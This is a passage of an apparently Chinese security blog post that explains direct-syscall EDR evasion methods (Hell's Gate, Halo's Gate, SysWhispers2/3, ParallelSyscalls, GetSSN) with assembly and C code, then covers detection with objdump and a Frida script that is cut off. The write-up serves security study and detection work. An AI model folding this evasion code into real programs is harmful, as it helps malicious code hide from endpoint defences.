<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data</span><br><span class="line">	wSystemCall DWORD 000h</span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">	HellsGate PROC</span><br><span class="line">		mov wSystemCall, 000h</span><br><span class="line">		mov wSystemCall, ecx</span><br><span class="line">		ret</span><br><span class="line">	HellsGate ENDP</span><br><span class="line"></span><br><span class="line">	HellDescent PROC</span><br><span class="line">		mov r10, rcx</span><br><span class="line">		mov eax, wSystemCall</span><br><span class="line"></span><br><span class="line">		syscall</span><br><span class="line">		ret</span><br><span class="line">	HellDescent ENDP</span><br><span class="line">end</span><br></pre></td></tr></table></figure>



<p>这里执行payload</p>
<p><img src="/2022/03/14/syscall/image-20220303172723877.png" alt="image-20220303172723877"></p>
<h5 id="SysWhisoers2"><a href="#SysWhisoers2" class="headerlink" title="SysWhisoers2"></a>SysWhisoers2</h5><p><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p>
<p><img src="/2022/03/14/syscall/image-20220302180209698.png" alt="image-20220302180209698"></p>
<p><code>SysWhisoers2</code>很方便，用python脚本生成需要的文件，通过包含头文件就可以syscall。</p>
<p>Syswhispers2 相比于一代版本，不再需要指定 Windows 版本，也不依赖于以往的系统调用表，没有从磁盘读取 Ntdll.ll  无惧 Hook,这里仅仅获取 <code>Syscall Number</code>，进三环部分自己实现.</p>
<p><code>SW2_PopulateSyscallList</code>函数其具体含义是先解析 Ntdll.dll 的 导出地址表 EAT，定位所有以 “Zw” 开头的函数，最后按地址从小到大进行排序。代码太长这里就不贴了，项目里有</p>
<p>另一个函数是 <code>SW2_GetSyscallNumber</code>，这个函数循环遍历 <code>SW2_PopulateSyscallList</code>  的数组，如果 Hash 相等就返回 循环的值 作为 SyscallNumber。</p>
<p><img src="/2022/03/14/syscall/image-20220304010508030.png" alt="image-20220304010508030"></p>
<h5 id="Halo’s-Gate：光环之门"><a href="#Halo’s-Gate：光环之门" class="headerlink" title="Halo’s Gate：光环之门"></a>Halo’s Gate：光环之门</h5><p><a href="https://github.com/boku7/AsmHalosGate">https://github.com/boku7/AsmHalosGate</a></p>
<p>地狱之门实现了动态的系统调用，amazing，但也有一点缺点，如果访问的那块内存不是ntdll.dll呢，即ntdll.dll被修改了，Nt*函数被hook。这个时候地狱之门就会失效，这个时候出现了光环之门</p>
<p>原理：EDR不可能HOOK全部的Nt*函数，总有一些不敏感的函数没有被HOOK，程序当中以STUB_SIZE(这个长度为32)上下循环遍历，找到没有被HOOK的STUB后获取其系统调用号再减去移动的步数，就是所要搜索的系统调用号。这种方式的优点是可以避免所要搜索的函数被hook之后，程序直接返回。</p>
<h5 id="TartarusGate"><a href="#TartarusGate" class="headerlink" title="TartarusGate:"></a>TartarusGate:</h5><p><a href="https://github.com/trickster0/TartarusGate">https://github.com/trickster0/TartarusGate</a></p>
<p>这个项目的作者声称是对光环之门的加强，只是检测第一个字节和第四个字节是否是0xe9，来判断函数是否被hook，个人感觉意义并不是很大，在光环之门中已经实现了 遍历相邻的Nt*函数来搜索系统调用号，多出来的check字节，有点锦上添花。</p>
<p><img src="/2022/03/14/syscall/image-20220303214153418.png" alt="image-20220303214153418"></p>
<p>另外在asm中做了一些nop混淆，方便syscall</p>
<p><img src="/2022/03/14/syscall/image-20220303213710095.png" alt="image-20220303213710095"></p>
<p><img src="/2022/03/14/syscall/image-20220303213729361.png" alt="image-20220303213729361"></p>
<h5 id="Spoofing-Gate：欺骗之门"><a href="#Spoofing-Gate：欺骗之门" class="headerlink" title="Spoofing-Gate：欺骗之门"></a>Spoofing-Gate：欺骗之门</h5><p><a href="https://github.com/timwhitez/Spoofing-Gate">https://github.com/timwhitez/Spoofing-Gate</a></p>
<p>主要原理是当使用halos gate/hells gate获取到sysid后 从ntdll中随机选择未用到的Nt api， 替换其sysid为获取到的sysid即可直接call。 在设计上面调用时加入了一个排除项可以输入[]string类型以避免api调用冲突， 内置的Nt api list已经排除了EDRs项目中被hook的api ，内置的Nt api list排除了部分可能影响到正常执行的api 返回的结构体实现了Revover()函数可以直接恢复原sysid 。缺点是必须修改ntdll，有两种方式：(NtProtect+memcpy/WriteProcessMemory) 作者选用的是后者，在写入前后会自动修改protect值</p>
<h5 id="ParallelSyscalls"><a href="#ParallelSyscalls" class="headerlink" title="ParallelSyscalls"></a>ParallelSyscalls</h5><p><a href="https://github.com/mdsecactivebreach/ParallelSyscalls">https://github.com/mdsecactivebreach/ParallelSyscalls</a></p>
<p><a href="https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/">https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/</a></p>
<p>该项目的亮点是使用syscall从磁盘读取ntdll.dll，最后一步利用 <code>LdrpThunkSignature</code> 恢复系统调用。还涉及到dll的并行加载，并行加载允许进程执行递归映射通过进程模块导入表导入的 DLL 的过程，而不是在单个线程上同步 ， 从而在初始应用程序启动期间提高性能。</p>
<p><code>LdrpThunkSignature</code> 恢复系统调用实现代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InitSyscallsFromLdrpThunkSignature</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PPEB_LDR_DATA Ldr = Peb-&gt;Ldr;</span><br><span class="line">    PLDR_DATA_TABLE_ENTRY NtdllLdrEntry = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (PLDR_DATA_TABLE_ENTRY LdrEntry = (PLDR_DATA_TABLE_ENTRY)Ldr-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">        LdrEntry-&gt;DllBase != <span class="literal">NULL</span>;</span><br><span class="line">        LdrEntry = (PLDR_DATA_TABLE_ENTRY)LdrEntry-&gt;InLoadOrderLinks.Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_wcsnicmp(LdrEntry-&gt;BaseDllName.Buffer, <span class="string">L&quot;ntdll.dll&quot;</span>, <span class="number">9</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// got ntdll</span></span><br><span class="line">            NtdllLdrEntry = LdrEntry;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (NtdllLdrEntry == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)NtdllLdrEntry-&gt;DllBase + ((PIMAGE_DOS_HEADER)NtdllLdrEntry-&gt;DllBase)-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&amp;ImageNtHeaders-&gt;OptionalHeader + ImageNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line">    ULONG_PTR DataSectionAddress = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD DataSectionSize;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; ImageNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)SectionHeader[i].Name, <span class="string">&quot;.data&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            DataSectionAddress = (ULONG_PTR)NtdllLdrEntry-&gt;DllBase + SectionHeader[i].VirtualAddress;</span><br><span class="line">            DataSectionSize = SectionHeader[i].Misc.VirtualSize;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD dwSyscallNo_NtOpenFile = <span class="number">0</span>, dwSyscallNo_NtCreateSection = <span class="number">0</span>, dwSyscallNo_NtMapViewOfSection = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!DataSectionAddress || DataSectionSize &lt; <span class="number">16</span> * <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (UINT uiOffset = <span class="number">0</span>; uiOffset &lt; DataSectionSize - (<span class="number">16</span> * <span class="number">5</span>); uiOffset++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(DWORD*)(DataSectionAddress + uiOffset) == <span class="number">0xb8d18b4c</span> &amp;&amp;</span><br><span class="line">            *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">16</span>) == <span class="number">0xb8d18b4c</span> &amp;&amp;</span><br><span class="line">            *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">32</span>) == <span class="number">0xb8d18b4c</span> &amp;&amp;</span><br><span class="line">            *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">48</span>) == <span class="number">0xb8d18b4c</span> &amp;&amp;</span><br><span class="line">            *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">64</span>) == <span class="number">0xb8d18b4c</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            dwSyscallNo_NtOpenFile = *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">4</span>);</span><br><span class="line">            dwSyscallNo_NtCreateSection = *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">16</span> + <span class="number">4</span>);</span><br><span class="line">            dwSyscallNo_NtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOffset + <span class="number">64</span> + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dwSyscallNo_NtOpenFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG_PTR SyscallRegion = (ULONG_PTR)VirtualAlloc(<span class="literal">NULL</span>, <span class="number">3</span> * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!SyscallRegion)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NtOpenFile = (FUNC_NTOPENFILE)BuildSyscallStub(SyscallRegion, dwSyscallNo_NtOpenFile);</span><br><span class="line">    NtCreateSection = (FUNC_NTCREATESECTION)BuildSyscallStub(SyscallRegion + MAX_SYSCALL_STUB_SIZE, dwSyscallNo_NtCreateSection);</span><br><span class="line">    NtMapViewOfSection = (FUNC_NTMAPVIEWOFSECTION)BuildSyscallStub(SyscallRegion + (<span class="number">2</span>* MAX_SYSCALL_STUB_SIZE), dwSyscallNo_NtMapViewOfSection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="GetSSN"><a href="#GetSSN" class="headerlink" title="GetSSN"></a>GetSSN</h5><p>这里还介绍一种更加方便简单和迅速的方法来发现SSN(syscall number),这种方法不需要unhook，不需要手动从代码存根中读取，也不需要加载NTDLL新副本，可以将它理解成为光环之门的延伸，试想当上下的邻函数都被Hook时，光环之门的做法是继续递归，在不断的寻找没有被Hook的邻函数，而在这里假设一种最坏的情况是所有的邻函数(指Nt*函数)都被Hook时，那最后将会向上递归到<code>SSN=0</code>的Nt函数。</p>
<p>其实可以理解为系统调用的存根重新实现 + 动态 SSN 解析</p>
<p>首先我们需要知道：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.实际上所有的Zw函数和Nt同名函数实际上是等价的</span><br><span class="line">2.系统调用号实际上是和Zw函数按照地址顺序的排列是一样的</span><br></pre></td></tr></table></figure>

<p>因此我们就只需要遍历所有Zw函数，记录其函数名和函数地址，最后将其按照函数地址升序排列后，每个函数的SSN就是其对应的排列顺序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetSSN</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt; Nt_Table;</span><br><span class="line">    PBYTE ImageBase;</span><br><span class="line">    PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PLDR_MODULE pLoadModule;</span><br><span class="line">    <span class="comment">// NTDLL</span></span><br><span class="line">    pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">    ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line"></span><br><span class="line">    Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    <span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">    File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line">    Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">    ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNames);</span><br><span class="line">    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; ExportTable-&gt;NumberOfNames; cx++)</span><br><span class="line">    &#123;</span><br><span class="line">        PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);</span><br><span class="line">        PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)pczFunctionName, <span class="string">&quot;Zw&quot;</span>,<span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">            Nt_Table[(<span class="keyword">int</span>)pFunctionAddress] = (<span class="built_in">string</span>)pczFunctionName;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">int</span>, <span class="built_in">string</span>&gt;::iterator iter = Nt_Table.begin(); iter != Nt_Table.end(); ++iter) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;index:&quot;</span> &lt;&lt; index  &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        index += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="SysWhispers3"><a href="#SysWhispers3" class="headerlink" title="SysWhispers3"></a>SysWhispers3</h5><p><a href="https://github.com/klezVirus/SysWhispers3">klezVirus/SysWhispers3：  AV/EDR通过直接系统调用规避。 (github.com)</a></p>
<p>在做完之前的笔记不久，又出现了新的 SysWhisper3 ，重点解决了 SysWhisper2中syscall指令被查杀，syscall不是从ntdll发出这两个问题。</p>
<p>这里可以与之前的项目比较，其中有个叫EGG的手段，先用垃圾指令替代syscall，在运行的时候从内存中找出来替换syscall。</p>
<p>前面也提到了，可以用int2e来替换syscall指令，但AV也不是傻子，加一条规则就可以检测到。</p>
<p>这里的egg hunt，使用“DB”来定义一个字节的汇编指令，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtAllocateVirtualMemory PROC</span><br><span class="line">  mov [rsp +8], rcx          ; Save registers.</span><br><span class="line">  mov [rsp+16], rdx</span><br><span class="line">  mov [rsp+24], r8</span><br><span class="line">  mov [rsp+32], r9</span><br><span class="line">  sub rsp, 28h</span><br><span class="line">  mov ecx, 003970B07h        ; Load function hash into ECX.</span><br><span class="line">  call SW2_GetSyscallNumber  ; Resolve function hash into syscall number.</span><br><span class="line">  add rsp, 28h</span><br><span class="line">  mov rcx, [rsp +8]          ; Restore registers.</span><br><span class="line">  mov rdx, [rsp+16]</span><br><span class="line">  mov r8, [rsp+24]</span><br><span class="line">  mov r9, [rsp+32]</span><br><span class="line">  mov r10, rcx</span><br><span class="line">  DB 77h                     ; &quot;w&quot;</span><br><span class="line">  DB 0h                      ; &quot;0&quot;</span><br><span class="line">  DB 0h                      ; &quot;0&quot;</span><br><span class="line">  DB 74h                     ; &quot;t&quot;</span><br><span class="line">  DB 77h                     ; &quot;w&quot;</span><br><span class="line">  DB 0h                      ; &quot;0&quot;</span><br><span class="line">  DB 0h                      ; &quot;0&quot;</span><br><span class="line">  DB 74h                     ; &quot;t&quot;</span><br><span class="line">  ret</span><br><span class="line">NtAllocateVirtualMemory ENDP</span><br></pre></td></tr></table></figure>

<p>但是在实际使用中这种方式程序会出错，因为该函数只为了syscall的调用和返回提供了堆栈，没有释放，</p>
<p>因此作者用下面的函数来进行转换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FindAndReplace</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> egg[], <span class="keyword">unsigned</span> <span class="keyword">char</span> replace[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ULONG64 startAddress = <span class="number">0</span>;</span><br><span class="line">    ULONG64 size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    GetMainModuleInformation(&amp;startAddress, &amp;size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error detecting main module size&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG64 currentOffset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* current = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">size_t</span> nBytesRead;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Starting search from: 0x%llu\n&quot;</span>, (ULONG64)startAddress + currentOffset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (currentOffset &lt; size - <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        currentOffset++;</span><br><span class="line">        LPVOID currentAddress = (LPVOID)(startAddress + currentOffset);</span><br><span class="line">        <span class="keyword">if</span>(DEBUG &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Searching at 0x%llu\n&quot;</span>, (ULONG64)currentAddress);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ReadProcessMemory((HANDLE)((<span class="keyword">int</span>)<span class="number">-1</span>), currentAddress, current, <span class="number">8</span>, &amp;nBytesRead)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Error reading from memory\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nBytesRead != <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Error reading from memory\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(DEBUG &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nBytesRead; i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, current[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(egg, current, <span class="number">8</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Found at %llu\n&quot;</span>, (ULONG64)currentAddress);</span><br><span class="line">            WriteProcessMemory((HANDLE)((<span class="keyword">int</span>)<span class="number">-1</span>), currentAddress, replace, <span class="number">8</span>, &amp;nBytesRead);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ended search at:   0x%llu\n&quot;</span>, (ULONG64)startAddress + currentOffset);</span><br><span class="line">    <span class="built_in">free</span>(current);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> egg[] = &#123; <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x74</span> &#125;; </span><br><span class="line">    <span class="comment">// w00tw00t</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> replace[] = &#123; <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0xC3</span>, <span class="number">0x90</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span> &#125;; </span><br><span class="line">    <span class="comment">// syscall; nop; nop; ret; nop; int3; int3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//####SELF_TAMPERING####</span></span><br><span class="line">    (egg, replace);</span><br><span class="line"></span><br><span class="line">    Inject();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然，这样还是被检测到。这是因为edr不仅检测syscall的字符，还检测syscall执行特定指令的位置。即如果合理的话，syscall本应在ntdll中调用。</p>
<p>下图显示了当api调用syscall的正常流程。</p>
<p><img src="/2022/03/14/syscall/image-20220310014525396.png" alt="image-20220310014525396"></p>
<p>而当 SysWhispers 调用函数时，<code>syscall</code>指令直接在程序的主模块中执行，如图</p>
<p><img src="/2022/03/14/syscall/image-20220310014618135.png" alt="image-20220310014618135"></p>
<p>这个区别也是EDR检测的特征，即RIP指针指向的不同</p>
<p>作者也提供了绕过方式，即<strong>在运行的时候从内存中动态找出替换syscall</strong>。</p>
<p>实现逻辑：</p>
<p>添加一个<code>ULONG64</code>字段来存储<code>syscall</code>指令绝对地址。有了这个集合，当<code>_SW2_SYSCALL_LIST</code>被填充时，计算 <code>syscall</code>指令的地址。在这种情况下，我们已经有了<code>ntdll.dll</code>基地址，SysWhispers 还从 DLL EAT（导出地址表）计算函数 RVA。最后**jmp syscall<address>**因此，唯一需要计算的是<code>syscall</code>指令的相对位置并进行一些数学运算。</address></p>
<p>伪代码实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function findOffset(HANDLE current_process, int64 start_address, int64 dllSize) -&gt; int64:</span><br><span class="line">  int64 offset = 0</span><br><span class="line">  bytes signature = &quot;\x0f\x05\x03&quot;</span><br><span class="line">  bytes currentbytes = &quot;&quot;</span><br><span class="line">  while currentbytes != signature:</span><br><span class="line">    offset++</span><br><span class="line">    if offset + 3 &gt; dllSize:</span><br><span class="line">      return INFINITE</span><br><span class="line">    ReadProcessMemory(current_process, start_address + offset, &amp;currentbytes, 3, nullptr)</span><br><span class="line">  return start_address + offset </span><br></pre></td></tr></table></figure>



<h2 id="检测syscall"><a href="#检测syscall" class="headerlink" title="检测syscall"></a>检测syscall</h2><p>利用syscall的文章、项目很多，但检测syscall的却很少见，这里浅谈一下如何检测</p>
<p>ntdll.dll中的系统调用都遵循代码结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r10, rcx</span><br><span class="line">mov eax, *syscall number*</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>如果仅仅根据特征码来检测，比如检测 <code>mov r10, rcx</code>，很显然不可行，很容易就被bypass，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r11,rcx</span><br><span class="line">mov r10,r11</span><br></pre></td></tr></table></figure>

<h5 id="磁盘检测"><a href="#磁盘检测" class="headerlink" title="磁盘检测"></a>磁盘检测</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump --disassemble -M intel Outflank-Dumpert.exe | grep &quot;syscall&quot;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">140013438:   0f 05                   syscall</span><br><span class="line">140013443:   0f 05                   syscall</span><br><span class="line">14001344e:   0f 05                   syscall</span><br><span class="line">[truncated]</span><br><span class="line">14001356c:   0f 05                   syscall</span><br><span class="line">140013577:   0f 05                   syscall</span><br><span class="line">140013582:   0f 05                   syscall</span><br></pre></td></tr></table></figure>

<h5 id="使用-Frida-检测直接系统调用"><a href="#使用-Frida-检测直接系统调用" class="headerlink" title="使用 Frida 检测直接系统调用"></a>使用 Frida 检测直接系统调用</h5><p>作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.解决 NTDLL 的界限</span><br><span class="line">2.在 NtAcceptConnectPort 上放置一个钩子。这是第一个 Nt 函数，它将帮助我们验证即使在函数上放置了一个钩子，syscall也应该是完整的。</span><br><span class="line">3.向每个线程添加一个 Stalker，它将检查每条指令以查看它是否是syscall。如果是，那么我们将检查它是否在 NTDLL 的范围内。如果它在 NTDLL 之外，那么我们将对其附加一个标注，它将查看 EAX 寄存器并告诉我们系统调用号。然后我们将告警恶意syscall。</span><br></pre></td></tr></table></figure>

<p>Stalker 是 Frida 的代码跟踪引擎，它允许我们跟踪给定线程的所有指令</p>
<p>脚本源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var modules = Process.enumerateModules()</span><br><span class="line">var ntdll = modules[1]</span><br><span class="line"></span><br><span class="line">var ntdllBase = ntdll.base</span><br><span class="line">send(&quot;[*] Ntdll base: &quot; + ntdllBase)</span><br><span class="line">var ntdllOffset = ntdllBase.add(ntdll.size)</span><br><span class="line">send(&quot;[*] Ntdll end: &quot; + ntdllOffset)</span><br><span class="line"></span><br><span class="line">var pNtAcceptConnectPort = Module.findExportByName(&#x27;ntdll.dll&#x27;, &#x27;NtAcceptConnectPort&#x27;);</span><br><span class="line">Interceptor.attach(pNtAcceptConnectPort, &#123;</span><br><span class="line">    onEnter: function (args)&#123;&#125;</span><br><span class="line">&#125;)</span><br><span class="line">const mainThread = Process.enumerateThreads()[0];</span><br><span class="line">Process.enumerateThreads().map(t =&gt; &#123;</span><br><span class="line">Stalker.follow(t.id, &#123;</span><br><span class="line">  events: &#123;</span><br><span class="line">    call: false, // CALL instructions: yes please</span><br><span class="line">    // Other events:</span><br><span class="line">    ret: false, // RET instructions</span><br><span class="line">    exec: false, // all instructions: not recommended as it&#x27;s</span><br><span class="line">                 //                   a lot of data</span><br><span class="line">    block: false, // block executed: coarse execution trace</span><br><span class="line">    compile: false // block compiled: useful for coverage</span><br><span class="line">  &#125;,</span><br><span class="line">  onReceive(events) &#123;  </span><br><span class="line">  &#125;,</span><br><span 